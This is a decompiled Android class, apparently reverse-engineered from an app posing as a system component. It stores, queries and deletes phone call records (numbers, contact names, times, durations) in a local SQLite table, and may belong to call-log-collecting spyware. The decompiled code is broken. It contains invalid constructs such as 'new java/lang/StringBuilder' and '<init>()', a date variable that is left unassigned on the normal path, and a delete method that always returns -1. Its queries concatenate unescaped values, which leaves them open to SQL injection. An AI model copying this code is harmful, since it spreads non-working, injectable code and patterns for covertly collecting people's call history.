package com.app.system.common.h;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.app.system.common.entity.Call;
import com.app.system.common.h;
import com.security.d.a;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class d
  extends b
{
  public d(Context paramContext)
  {
    super(paramContext);
  }
  
  public int a(List<Call> paramList)
  {
    int i = 0;
    if (paramList != null) {
      try
      {
        if (paramList.size() == 0) {
          return -2;
        }
        b();
        String str = "delete from  call WHERE 1=0 ";
        Object localObject = paramList.iterator();
        while (((Iterator)localObject).hasNext())
        {
          Call localCall = (Call)((Iterator)localObject).next();
          StringBuilder localStringBuilder = new java/lang/StringBuilder;
          localStringBuilder.<init>();
          localStringBuilder.append(str);
          localStringBuilder.append(" or rowid = ");
          localStringBuilder.append(localCall.f());
          str = localStringBuilder.toString();
        }
        localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        ((StringBuilder)localObject).append("Delete total CALL : ");
        ((StringBuilder)localObject).append(paramList.size());
        a.d("FileCall", ((StringBuilder)localObject).toString(), new Object[0]);
        this.a.execSQL(str);
        a();
      }
      catch (Exception paramList)
      {
        a.a("FileCall", paramList.getMessage(), new Object[0]);
      }
    }
    i = -1;
    return i;
  }
  
  public Call a(Cursor paramCursor)
  {
    Call localCall = new Call();
    localCall.c(paramCursor.getLong(0));
    localCall.a(paramCursor.getString(1));
    localCall.b(paramCursor.getString(2));
    localCall.a(paramCursor.getLong(3));
    localCall.b(paramCursor.getLong(4));
    localCall.a(paramCursor.getInt(5));
    return localCall;
  }
  
  public List<Call> a(Date paramDate1, Date paramDate2, int paramInt)
  {
    ArrayList localArrayList = new ArrayList();
    Date localDate1 = paramDate1;
    Date localDate2;
    if (paramDate1 == null) {
      try
      {
        localDate1 = new java/util/Date;
        Date localDate3 = new java/util/Date;
        localDate3.<init>();
        localDate1.<init>(localDate3.getTime() - 604800000L);
      }
      catch (Exception localException)
      {
        a.a("FileCall", localException.getMessage(), new Object[0]);
        localDate2 = paramDate1;
      }
    }
    paramDate1 = paramDate2;
    if (paramDate2 == null) {
      paramDate1 = new Date();
    }
    long l = paramDate1.getTime() / 1000L;
    paramDate1 = new StringBuilder();
    paramDate1.append("select rowid, address, person_name, date, duration, flags from call where date > ");
    paramDate1.append(localDate2.getTime() / 1000L);
    paramDate1.append(" and date <= ");
    paramDate1.append(l);
    paramDate1 = paramDate1.toString();
    if (paramInt == 0)
    {
      paramDate2 = new StringBuilder();
      paramDate2.append(paramDate1);
      paramDate2.append(" order by date asc");
      paramDate1 = paramDate2.toString();
    }
    else
    {
      paramDate2 = new StringBuilder();
      paramDate2.append(paramDate1);
      paramDate2.append(" order by date asc limit ");
      paramDate2.append(paramInt);
      paramDate1 = paramDate2.toString();
    }
    b();
    paramDate2 = this.a.rawQuery(paramDate1, null);
    paramDate1 = new StringBuilder();
    paramDate1.append("CALL : Get ");
    paramDate1.append(paramInt);
    paramDate1.append(" / ");
    paramDate1.append(paramDate2.getCount());
    paramDate1.append(" RECORDS.");
    a.d("FileCall", paramDate1.toString(), new Object[0]);
    if (paramDate2.moveToFirst()) {
      do
      {
        localArrayList.add(a(paramDate2));
      } while (paramDate2.moveToNext());
    }
    paramDate2.close();
    a();
    return localArrayList;
  }
  
  public boolean a(Call paramCall)
  {
    try
    {
      b();
      SQLiteDatabase localSQLiteDatabase = this.a;
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append("insert into call (address, person_name, date, duration,flags) select '");
      localStringBuilder.append(paramCall.a());
      localStringBuilder.append("', '");
      localStringBuilder.append(paramCall.e());
      localStringBuilder.append("', ");
      localStringBuilder.append(paramCall.b());
      localStringBuilder.append(", ");
      localStringBuilder.append(paramCall.c());
      localStringBuilder.append(", ");
      localStringBuilder.append(paramCall.d());
      localStringBuilder.append(" where not exists (select 1 from call where address = '");
      localStringBuilder.append(h.a(paramCall.a()));
      localStringBuilder.append("' and date = ");
      localStringBuilder.append(paramCall.b());
      localStringBuilder.append(" and duration = ");
      localStringBuilder.append(paramCall.c());
      localStringBuilder.append(" and flags = ");
      localStringBuilder.append(paramCall.d());
      localStringBuilder.append(")");
      localSQLiteDatabase.execSQL(localStringBuilder.toString());
      a();
      return true;
    }
    catch (Exception paramCall)
    {
      a.d("FileCall", paramCall.getMessage(), new Object[0]);
    }
    return false;
  }
}


/* Location:              ~/com/app/system/common/h/d.class
 *
 * Reversed by:           J
 */